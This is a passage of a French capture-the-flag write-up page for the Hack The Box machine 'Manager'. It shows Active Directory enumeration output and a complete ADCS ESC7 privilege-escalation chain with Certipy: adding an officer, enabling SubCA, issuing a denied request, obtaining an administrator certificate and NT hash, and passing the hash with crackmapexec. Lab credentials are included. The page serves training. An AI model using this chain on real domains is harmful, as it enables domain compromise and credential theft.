+     / _  |/ _  |  ___/|  __|   / /\ \  \___ \
+    | (_| | (_| | |    | |____ / ____ \ ____) |
+     \__,_|\__,_|_|    |______/_/    \_\_____/
+                                            Version 0.8.13
+
+    Active Directory Enumeration
+    by @61106960
+
+    Legend
+        [?] Searching for juicy information
+        [!] Found a vulnerability which may can be exploited in some way
+        [+] Found some interesting information for further investigation
+        [*] Some kind of note
+        [#] Reserved
+
+
+[?] +++++ Searching for Juicy Active Directory Information +++++
+
+[?] +++++ Checking General Domain Information +++++
+[+] Found general Active Directory domain information for domain 'manager.htb':
+Domain Name:                            manager.htb
+Domain SID:                             S-1-5-21-4078382237-1492182817-2568127209
+Domain Functional Level:                Windows 2016
+Forest Name:                            manager.htb
+Forest Children:                        No Subdomain[s] available
+Domain Controller:                      dc01.manager.htb
+
+[?] +++++ Checking Domain Policies +++++
+[+] Found password policy of domain 'manager.htb':
+Minimum Password Age:                   1 days
+Maximum Password Age:                   42 days
+[+] Minimum Password Length:            7 character
+[!] Password Complexity:                Disabled
+[!] Lockout Account:                    Disabled
+Reversible Encryption:                  Disabled
+[+] Found Kerberos policy of domain 'manager.htb':
+Maximum Age of TGT:                     10 hours
+Maximum Age of TGS:                     600 minutes
+Maximum Clock Time Difference:          5 minutes
+Krbtgt Password Last Set:               07/27/2023 03:19:45
+
+[?] +++++ Checking Domain Controller, Sites and Subnets +++++
+[+] Found domain controller of domain 'manager.htb':
+DC Host Name:                           dc01.manager.htb
+DC Roles:                               SchemaRole,NamingRole,PdcRole,RidRole,InfrastructureRole
+DC IP Address:                          ::1
+Site Name:                              Default-First-Site-Name
+
+
+[?] +++++ Checking Forest and Domain Trusts +++++
+
+[?] +++++ Checking Juicy Permissions +++++
+
+[?] +++++ Checking Add-Computer Permissions +++++
+[+] Filtering found identities that can add a computer object to domain '':
+[!] Every member of group 'Authenticated Users' can add a computer to domain ''
+
+distinguishedName:                      CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=manager,DC=htb
+objectSid:                              S-1-5-11
+memberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb
+                                        CN=Certificate Service DCOM Access,CN=Builtin,DC=manager,DC=htb
+                                        CN=Users,CN=Builtin,DC=manager,DC=htb
+
+
+[?] +++++ Checking DCSync Permissions +++++
+[+] Filtering found identities that can perform DCSync in domain '':
+
+[?] +++++ Checking LAPS Permissions +++++
+
+[?] +++++ Searching for GPO local group membership Information +++++
+
+[?] +++++ Searching for Active Directory Certificate Services Information +++++
+[+] Found at least one available Active Directory Certificate Service
+adPEAS does basic enumeration only, consider reading https://posts.specterops.io/certified-pre-owned-d95910965cd2
+
+[+] Found Active Directory Certificate Services 'manager-DC01-CA':
+CA Name:                                manager-DC01-CA
+CA dnshostname:                         dc01.manager.htb
+CA IP Address:                          10.10.11.236
+Date of Creation:                       07/27/2023 10:31:05
+DistinguishedName:                      CN=manager-DC01-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
+NTAuthCertificates:                     True
+Available Templates:                    SubCA
+                                        DirectoryEmailReplication
+                                        DomainControllerAuthentication
+                                        KerberosAuthentication
+                                        EFSRecovery
+                                        EFS
+                                        DomainController
+                                        WebServer
+                                        Machine
+                                        User
+                                        Administrator
+
+[?] +++++ Searching for Vulnerable Certificate Templates +++++
+adPEAS does basic enumeration only, consider using https://github.com/GhostPack/Certify or https://github.com/ly4k/Certipy
+
+[?] +++++ Checking Template 'SubCA' +++++
+[!] Template 'SubCA' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
+Template Name:                          SubCA
+Template distinguishedname:             CN=SubCA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
+Date of Creation:                       07/27/2023 10:31:05
+EnrollmentFlag:                         0
+[!] CertificateNameFlag:                ENROLLEE_SUPPLIES_SUBJECT
+
+[?] +++++ Checking Template 'DirectoryEmailReplication' +++++
+
+[?] +++++ Checking Template 'DomainControllerAuthentication' +++++
+
+[?] +++++ Checking Template 'KerberosAuthentication' +++++
+
+[?] +++++ Checking Template 'EFSRecovery' +++++
+
+[?] +++++ Checking Template 'EFS' +++++
+[+] Identity 'MANAGER\Domain Users' has enrollment rights for template 'EFS'
+Template Name:                          EFS
+Template distinguishedname:             CN=EFS,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
+Date of Creation:                       07/27/2023 10:31:05
+Extended Key Usage:                     Encrypting File System
+EnrollmentFlag:                         INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+CertificateNameFlag:                    SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+[+] Enrollment allowed for:             MANAGER\Domain Users
+
+[?] +++++ Checking Template 'DomainController' +++++
+
+[?] +++++ Checking Template 'WebServer' +++++
+[!] Template 'WebServer' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
+Template Name:                          WebServer
+Template distinguishedname:             CN=WebServer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
+Date of Creation:                       07/27/2023 10:31:05
+Extended Key Usage:                     Server Authentication
+EnrollmentFlag:                         0
+[!] CertificateNameFlag:                ENROLLEE_SUPPLIES_SUBJECT
+
+[?] +++++ Checking Template 'Machine' +++++
+[+] Identity 'MANAGER\Domain Computers' has enrollment rights for template 'Machine'
+Template Name:                          Machine
+Template distinguishedname:             CN=Machine,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
+Date of Creation:                       07/27/2023 10:31:05
+[+] Extended Key Usage:                 Client Authentication, Server Authentication
+EnrollmentFlag:                         AUTO_ENROLLMENT
+CertificateNameFlag:                    SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
+[+] Enrollment allowed for:             MANAGER\Domain Computers
+
+[?] +++++ Checking Template 'User' +++++
+[+] Identity 'MANAGER\Domain Users' has enrollment rights for template 'User'
+Template Name:                          User
+Template distinguishedname:             CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
+Date of Creation:                       07/27/2023 10:31:05
+[+] Extended Key Usage:                 Encrypting File System, Secure E-mail, Client Authentication
+EnrollmentFlag:                         INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+CertificateNameFlag:                    SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+[+] Enrollment allowed for:             MANAGER\Domain Users
+
+[?] +++++ Checking Template 'Administrator' +++++
+
+[?] +++++ Searching for Credentials Exposure +++++
+
+[?] +++++ Searching for ASREProastable User +++++
+
+[?] +++++ Searching for Kerberoastable User +++++
+
+[?] +++++ Searching for User with 'Linux/Unix Password' attribute +++++
+
+[?] +++++ Searching for Computer with enabled and readable LAPS attribute +++++
+
+[?] +++++ Searching for Group Managed Service Account (gMSA) +++++
+
+[?] +++++ Searching for Credentials in SYSVOL Group Policy Files +++++
+
+[?] +++++ Searching for Sensitive Information in NETLOGON Share +++++
+
+[?] +++++ Searching for Delegation Issues +++++
+
+[?] +++++ Searching for Computer with Unconstrained Delegation Rights +++++
+
+[?] +++++ Searching for Computer with Constrained Delegation Rights +++++
+
+[?] +++++ Searching for Computer with Resource-Based Constrained Delegation Rights +++++
+
+[?] +++++ Searching for User with Constrained Delegation Rights +++++
+
+[?] +++++ Searching for User with Resource-Based Constrained Delegation Rights +++++
+
+[?] +++++ Starting Account Enumeration +++++
+
+[?] +++++ Searching for Azure AD Connect +++++
+
+[?] +++++ Searching for Users in High Privileged Groups +++++
+[+] Found members in group 'BUILTIN\Administrators':
+GroupName:                              Enterprise Admins
+distinguishedName:                      CN=Enterprise Admins,CN=Users,DC=manager,DC=htb
+objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-519
+[+] description:                        Designated administrators of the enterprise
+
+GroupName:                              Domain Admins
+distinguishedName:                      CN=Domain Admins,CN=Users,DC=manager,DC=htb
+objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-512
+[+] description:                        Designated administrators of the domain
+
+sAMAccountName:                         Administrator
+distinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb
+objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500
+memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb
+                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb
+[+] description:                        Built-in account for administering the computer/domain
+[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00
+pwdLastSet:                             07/27/2023 08:24:35
+lastLogonTimestamp:                     02/20/2024 11:40:08
+userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED
+[+] admincount:                         This identity is or was member of a high privileged admin group
+
+[+] Found members in group 'MANAGER\Domain Admins':
+sAMAccountName:                         Administrator
+distinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb
+objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500
+memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb
+                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb
+[+] description:                        Built-in account for administering the computer/domain
+[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00
+pwdLastSet:                             07/27/2023 08:24:35
+lastLogonTimestamp:                     02/20/2024 11:40:08
+userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED
+[+] admincount:                         This identity is or was member of a high privileged admin group
+
+[+] Found members in group 'MANAGER\Enterprise Admins':
+sAMAccountName:                         Administrator
+distinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb
+objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500
+memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb
+                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb
+[+] description:                        Built-in account for administering the computer/domain
+[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00
+pwdLastSet:                             07/27/2023 08:24:35
+lastLogonTimestamp:                     02/20/2024 11:40:08
+userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED
+[+] admincount:                         This identity is or was member of a high privileged admin group
+
+[+] Found members in group 'MANAGER\Group Policy Creator Owners':
+sAMAccountName:                         Administrator
+distinguishedName:                      CN=Administrator,CN=Users,DC=manager,DC=htb
+objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-500
+memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=manager,DC=htb
+                                        CN=Domain Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Enterprise Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Schema Admins,CN=Users,DC=manager,DC=htb
+                                        CN=Administrators,CN=Builtin,DC=manager,DC=htb
+[+] description:                        Built-in account for administering the computer/domain
+[*] accountexpires:                     This identity has been expired since 12/31/1600 16:00:00
+pwdLastSet:                             07/27/2023 08:24:35
+lastLogonTimestamp:                     02/20/2024 11:40:08
+userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, NOT_DELEGATED
+[+] admincount:                         This identity is or was member of a high privileged admin group
+
+[+] Found members in group 'BUILTIN\Access Control Assistance Operators':
+sAMAccountName:                         Raven
+distinguishedName:                      CN=Raven,CN=Users,DC=manager,DC=htb
+objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1116
+memberOf:                               CN=Remote Management Users,CN=Builtin,DC=manager,DC=htb
+pwdLastSet:                             07/27/2023 08:23:10
+lastLogonTimestamp:                     02/22/2024 12:13:56
+userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+
+[+] Found members in group 'MANAGER\Cert Publishers':
+sAMAccountName:                         DC01$
+distinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb
+objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000
+operatingsystem:                        Windows Server 2019 Standard
+memberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb
+                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb
+pwdLastSet:                             10/16/2023 14:00:03
+lastLogonTimestamp:                     02/20/2024 11:39:17
+[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+
+
+[?] +++++ Searching for High Privileged Users with a password older 5 years +++++
+
+[?] +++++ Searching for High Privileged User which may not require a Password +++++
+
+[?] +++++ Starting Computer Enumeration +++++
+
+[?] +++++ Searching for Domain Controllers +++++
+[+] Found Domain Controller 'DC01$':
+sAMAccountName:                         DC01$
+distinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb
+objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000
+operatingsystem:                        Windows Server 2019 Standard
+memberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb
+                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb
+pwdLastSet:                             10/16/2023 14:00:03
+lastLogonTimestamp:                     02/20/2024 11:39:17
+[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+
+
+[?] +++++ Searching for Exchange Servers +++++
+
+[?] +++++ Searching for ADCS Servers +++++
+[+] Found ADCS Server 'DC01$':
+sAMAccountName:                         DC01$
+distinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb
+objectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000
+operatingsystem:                        Windows Server 2019 Standard
+memberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb
+                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb
+pwdLastSet:                             10/16/2023 14:00:03
+lastLogonTimestamp:                     02/20/2024 11:39:17
+[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+
+
+[?] +++++ Searching for Outdated Operating Systems +++++
+
+[?] +++++ Searching for Detailed Active Directory Information with BloodHound +++++
+</code></pre>
+<p>Je pense que cela va tourner autour des certificats :)... Uploadons certify.exe, ce sera peut-être utile.</p>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Raven\Documents&gt; .\Certify.exe find /vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'
+
+[*] Listing info about the Enterprise CA 'manager-DC01-CA'
+
+    Enterprise CA Name            : manager-DC01-CA
+    DNS Hostname                  : dc01.manager.htb
+    FullName                      : dc01.manager.htb\manager-DC01-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
+    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
+    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
+    Cert Start Date               : 7/27/2023 3:21:05 AM
+    Cert End Date                 : 7/27/2122 3:31:04 AM
+    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Deny   ManageCA, Read                             MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
+      Allow  ManageCA, ManageCertificates               MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
+      Allow  ManageCA, Enroll                           MANAGER\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116
+      Allow  Enroll                                     MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
+    Enrollment Agent Restrictions : None
+
+[+] No Vulnerable Certificates Templates found!
+
+
+
+Certify completed in 00:00:08.0592263
+</code></pre>
+<h3 id="privesc-admin-esc7">Privesc Admin - ESC7</h3>
+<p>On dirait qu'on a tout ce qu'il faut pour abuser des certificats, let's go !</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
+
+pak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
+
+pak@DESKTOP-AF1CU53:~/tmp$ certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+[*] Request ID is 13
+Would you like to save the private key? (y/N) y
+[*] Saved private key to 13.key
+[-] Failed to request certificate
+
+pak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca &quot;manager-DC01-CA&quot; -issue-request 13 -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!
+123'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Successfully issued certificate
+
+pak@DESKTOP-AF1CU53:~/tmp$ certipy req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca &quot;manager-DC01-CA&quot; -target manager.htb -retrieve 13
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Rerieving certificate with ID 13
+[*] Successfully retrieved certificate
+[*] Got certificate with UPN 'administrator@manager.htb'
+[*] Certificate has no object SID
+[*] Loaded private key from '13.key'
+[*] Saved certificate and private key to 'administrator.pfx'
+</code></pre>
+<p>Puis on récupère le hash de l'administrateur :</p>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ certipy auth -pfx administrator.pfx
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@manager.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+</code></pre>
+<pre><code class="language-bash">pak@DESKTOP-AF1CU53:~/tmp$ crackmapexec smb 10.129.5.92 -u administrator -H 'ae5064c2f62317332c88629e025924ef'
+SMB         10.129.5.92     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+SMB         10.129.5.92     445    DC01             [+] manager.htb\administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pied de page" >
+        
+          
+          <a href="../Legacy/" class="md-footer__link md-footer__link--prev" aria-label="Précédent: Legacy">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Précédent
+              </span>
+              <div class="md-ellipsis">
+                Legacy
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../Pov/" class="md-footer__link md-footer__link--next" aria-label="Suivant: Pov">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Suivant
+              </span>
+              <div class="md-ellipsis">
+                Pov
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.path", "navigation.sections", "navigation.footer"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copi\u00e9 dans le presse-papier", "clipboard.copy": "Copier dans le presse-papier", "search.result.more.one": "1 de plus sur cette page", "search.result.more.other": "# de plus sur cette page", "search.result.none": "Aucun document trouv\u00e9", "search.result.one": "1 document trouv\u00e9", "search.result.other": "# documents trouv\u00e9s", "search.result.placeholder": "Taper pour d\u00e9marrer la recherche", "search.result.term.missing": "Non trouv\u00e9", "select.version": "S\u00e9lectionner la version"}}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.ad660dcc.min.js"></script>
+      
+    
+  </body>
+</html>
